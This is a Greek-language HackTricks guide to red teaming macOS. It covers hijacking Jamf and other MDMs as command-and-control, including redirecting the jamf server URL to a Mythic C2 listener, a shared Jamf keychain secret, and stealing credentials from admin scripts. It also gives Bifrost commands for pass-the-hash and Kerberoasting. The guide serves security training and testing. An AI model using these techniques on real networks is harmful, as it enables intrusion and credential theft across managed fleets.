# Red Teaming σε macOS

{{#include ../../banners/hacktricks-training.md}}


## Κατάχρηση MDMs

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

Αν καταφέρετε να **παραβιάσετε credentials διαχειριστή** για να αποκτήσετε πρόσβαση στην πλατφόρμα διαχείρισης, μπορείτε **ενδεχομένως να παραβιάσετε όλους τους υπολογιστές**, διανέμοντας το malware σας στα μηχανήματα.

Για Red Teaming σε περιβάλλοντα MacOS συνιστάται ιδιαίτερα να έχετε κάποια κατανόηση του τρόπου λειτουργίας των MDMs:


{{#ref}}
macos-mdm/
{{#endref}}

### Χρήση MDM ως C2

Ένα MDM θα έχει δικαιώματα εγκατάστασης, αναζήτησης ή αφαίρεσης profiles, εγκατάστασης εφαρμογών, δημιουργίας τοπικών λογαριασμών διαχειριστή, ορισμού firmware password, αλλαγής του κλειδιού FileVault...

Για να εκτελέσετε το δικό σας MDM, χρειάζεστε το **CSR σας υπογεγραμμένο από έναν vendor**, κάτι που μπορείτε να προσπαθήσετε να αποκτήσετε από το [**https://mdmcert.download/**](https://mdmcert.download/). Και για να εκτελέσετε το δικό σας MDM για Apple devices, μπορείτε να χρησιμοποιήσετε το [**MicroMDM**](https://github.com/micromdm/micromdm).

Ωστόσο, για να εγκαταστήσετε μια εφαρμογή σε μια enrolled συσκευή, εξακολουθείτε να χρειάζεστε υπογραφή από developer account... όμως, κατά το MDM enrolment, η **συσκευή προσθέτει το SSL cert του MDM ως trusted CA**, επομένως πλέον μπορείτε να υπογράψετε οτιδήποτε.<sup>[4]</sup>

Για να κάνετε enrol τη συσκευή σε ένα MDM, πρέπει να εγκαταστήσετε ένα αρχείο **`mobileconfig`** ως root, το οποίο μπορεί να παραδοθεί μέσω ενός αρχείου **pkg** (μπορείτε να το συμπιέσετε σε zip και, όταν ληφθεί από το Safari, θα αποσυμπιεστεί).

Ο **Mythic agent Orthrus** χρησιμοποιεί αυτή την τεχνική.

### Κατάχρηση του JAMF PRO

Το JAMF μπορεί να εκτελέσει **custom scripts** (scripts που έχουν αναπτυχθεί από τον sysadmin), **native payloads** (δημιουργία τοπικού λογαριασμού, ορισμός EFI password, παρακολούθηση αρχείων/διαδικασιών...) και **MDM** (configurations συσκευών, device certificates...).<sup>[5]</sup>

#### JAMF self-enrolment

Μεταβείτε σε μια σελίδα όπως η `https://<company-name>.jamfcloud.com/enroll/` για να ελέγξετε αν έχουν ενεργοποιημένο το **self-enrolment**. Αν το έχουν, ενδέχεται να **ζητήσει credentials για πρόσβαση**.

Μπορείτε να χρησιμοποιήσετε το script [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) για να πραγματοποιήσετε επίθεση password spraying.

Επιπλέον, αφού βρείτε έγκυρα credentials, ενδέχεται να μπορέσετε να κάνετε brute-force άλλα usernames με την παρακάτω φόρμα:

![Κατάχρηση του JAMF PRO - JAMF self-enrolment: Επιπλέον, αφού βρείτε έγκυρα credentials, ενδέχεται να μπορέσετε να κάνετε brute-force άλλα usernames με την παρακάτω φόρμα](<../../images/image (107).png>)

#### JAMF device Authentication

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

Το **`jamf`** binary περιείχε το secret για το άνοιγμα του keychain, το οποίο κατά τον χρόνο της ανακάλυψης ήταν **shared** μεταξύ όλων και ήταν: **`jk23ucnq91jfu9aj`**.<sup>[5]</sup>\
Επιπλέον, το jamf **παραμένει** ως **LaunchDaemon** στο **`/Library/LaunchAgents/com.jamf.management.agent.plist`**

#### JAMF Device Takeover

Το **URL** του **JSS** (Jamf Software Server) που θα χρησιμοποιεί το **`jamf`** βρίσκεται στο **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
Αυτό το αρχείο περιέχει ουσιαστικά το URL:
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://subdomain-company.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
Έτσι, ένας attacker θα μπορούσε να εγκαταστήσει ένα malicious package (`pkg`) που **αντικαθιστά αυτό το αρχείο**, ορίζοντας το **URL σε έναν Mythic C2 listener από έναν Typhon agent**, ώστε να μπορεί πλέον να κάνει abuse στο JAMF ως C2.
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
#### JAMF Impersonation

Για να **impersonate την επικοινωνία** μεταξύ μιας συσκευής και του JMF χρειάζεστε:

- Το **UUID** της συσκευής: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- Το **JAMF keychain** από: `/Library/Application\ Support/Jamf/JAMF.keychain`, το οποίο περιέχει το certificate της συσκευής

Με αυτές τις πληροφορίες, **δημιουργήστε ένα VM** με το **stolen** Hardware **UUID** και με **απενεργοποιημένο το SIP**, τοποθετήστε το **JAMF keychain**, κάντε **hook** τον Jamf **agent** και κλέψτε τις πληροφορίες του.

#### Secrets stealing

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

Θα μπορούσατε επίσης να παρακολουθείτε την τοποθεσία `/Library/Application Support/Jamf/tmp/` για τα **custom scripts** που οι admins ενδέχεται να θέλουν να εκτελέσουν μέσω Jamf, καθώς **τοποθετούνται εδώ, εκτελούνται και διαγράφονται**. Αυτά τα scripts **ενδέχεται να περιέχουν credentials**.

Ωστόσο, τα **credentials** ενδέχεται να περνούν σε αυτά τα scripts ως **parameters**, επομένως θα πρέπει να παρακολουθείτε το `ps aux | grep -i jamf` (χωρίς καν να είστε root).

Το script [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) μπορεί να ακούει για νέα αρχεία που προστίθενται και για νέα process arguments.

### macOS Remote Access

Και επίσης σχετικά με τα "special" **network** **protocols** του **MacOS**:


{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

Σε ορισμένες περιπτώσεις θα διαπιστώσετε ότι ο **MacOS υπολογιστής είναι συνδεδεμένος σε ένα AD**. Σε αυτό το σενάριο θα πρέπει να προσπαθήσετε να κάνετε **enumerate** το active directory όπως συνηθίζετε. Βρείτε κάποια **βοήθεια** στις ακόλουθες σελίδες:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}


{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

Κάποιο **local MacOS tool** που μπορεί επίσης να σας βοηθήσει είναι το `dscl`:
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
Επίσης, υπάρχουν ορισμένα tools που έχουν προετοιμαστεί για MacOS, ώστε να κάνουν αυτόματα enumerate το AD και να αλληλεπιδρούν με το kerberos:

- [**Machound**](https://github.com/XMCyber/MacHound): Το MacHound είναι ένα extension του Bloodhound auditing tool, που επιτρέπει τη συλλογή και την εισαγωγή σχέσεων του Active Directory σε hosts MacOS.<sup>[2]</sup>
- [**Bifrost**](https://github.com/its-a-feature/bifrost): Το Bifrost είναι ένα Objective-C project σχεδιασμένο για αλληλεπίδραση με τα Heimdal krb5 APIs στο macOS. Στόχος του project είναι να επιτρέψει καλύτερο security testing γύρω από το Kerberos σε macOS devices, χρησιμοποιώντας native APIs χωρίς να απαιτείται οποιοδήποτε άλλο framework ή package στο target.
- [**Orchard**](https://github.com/its-a-feature/Orchard): Tool JavaScript for Automation (JXA) για enumeration του Active Directory.

### Πληροφορίες Domain
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### Χρήστες

Οι τρεις τύποι χρηστών MacOS είναι:

- **Τοπικοί χρήστες** — Υποβάλλονται σε διαχείριση από την τοπική υπηρεσία OpenDirectory και δεν συνδέονται με κανέναν τρόπο στο Active Directory.
- **Χρήστες δικτύου** — Παροδικοί χρήστες του Active Directory, οι οποίοι απαιτούν σύνδεση στον διακομιστή DC για authentication.
- **Mobile Users** — Χρήστες του Active Directory με τοπικό backup για τα credentials και τα αρχεία τους.

Οι τοπικές πληροφορίες σχετικά με τους χρήστες και τις ομάδες αποθηκεύονται στον φάκελο _/var/db/dslocal/nodes/Default._\
Για παράδειγμα, οι πληροφορίες για τον χρήστη με το όνομα _mark_ αποθηκεύονται στο _/var/db/dslocal/nodes/Default/users/mark.plist_ και οι πληροφορίες για την ομάδα _admin_ βρίσκονται στο _/var/db/dslocal/nodes/Default/groups/admin.plist_.

Εκτός από τη χρήση των edges HasSession και AdminTo, το **MacHound προσθέτει τρία νέα edges** στη βάση δεδομένων του Bloodhound:<sup>[2]</sup>

- **CanSSH** - οντότητα που επιτρέπεται να χρησιμοποιεί SSH στον host
- **CanVNC** - οντότητα που επιτρέπεται να χρησιμοποιεί VNC στον host
- **CanAE** - οντότητα που επιτρέπεται να εκτελεί AppleEvent scripts στον host
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
Περισσότερες πληροφορίες στο [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)

### Κωδικός πρόσβασης Computer$

Λάβετε κωδικούς πρόσβασης χρησιμοποιώντας:
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
Είναι δυνατή η πρόσβαση στον κωδικό πρόσβασης του **`Computer$`** μέσα στο System keychain.

### Over-Pass-The-Hash

Λάβετε ένα TGT για έναν συγκεκριμένο user και service:
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
Μόλις συλλεχθεί το TGT, μπορείτε να το κάνετε inject στην τρέχουσα συνεδρία με:
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
Με τα service tickets που αποκτήθηκαν, είναι δυνατό να δοκιμάσετε να αποκτήσετε πρόσβαση σε shares σε άλλους υπολογιστές:
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## Πρόσβαση στο Keychain

Το Keychain πιθανότατα περιέχει ευαίσθητες πληροφορίες, οι οποίες, αν αποκτηθούν χωρίς να εμφανιστεί prompt, θα μπορούσαν να βοηθήσουν στην προώθηση ενός red team exercise:


{{#ref}}
macos-keychain.md
{{#endref}}

## Εξωτερικές υπηρεσίες

Το MacOS Red Teaming διαφέρει από ένα συνηθισμένο Windows Red Teaming, καθώς συνήθως το **MacOS είναι άμεσα ενσωματωμένο με διάφορες εξωτερικές πλατφόρμες**. Μια συνηθισμένη διαμόρφωση του MacOS είναι η πρόσβαση στον υπολογιστή με χρήση **συγχρονισμένων credentials του OneLogin και η πρόσβαση σε διάφορες εξωτερικές υπηρεσίες** (όπως github, aws...) μέσω του OneLogin.

## Διάφορες τεχνικές Red Team

### Safari

Όταν γίνεται λήψη ενός αρχείου στο Safari, αν είναι "safe" αρχείο, θα **ανοίξει αυτόματα**. Για παράδειγμα, αν **κατεβάσετε ένα zip**, θα αποσυμπιεστεί αυτόματα:

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>

## Αναφορές

- [1] [Gone Apple Pickin': Red Teaming σε περιβάλλοντα MacOS το 2021 - Cedric Owens (DEF CON 29)](https://www.youtube.com/watch?v=IiMladUbL6E)
- [2] [Παρουσίαση του MacHound: Μια λύση για επιθέσεις σε macOS βασισμένες στο Active Directory](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [3] [its-a-feature - Εντολές Domain Enumeration (ισοδύναμες των dscl / net / ldapsearch)](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [4] [Ελάτε στη σκοτεινή πλευρά, έχουμε Apples: Μετατρέποντας τη διαχείριση του macOS σε κακόβουλη](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [5] [OBTS v3.0: "Η οπτική ενός attacker για τις διαμορφώσεις του Jamf" - Luke Roberts / Calum Hall](https://www.youtube.com/watch?v=ju1IYWUv4ZA)


{{#include ../../banners/hacktricks-training.md}}
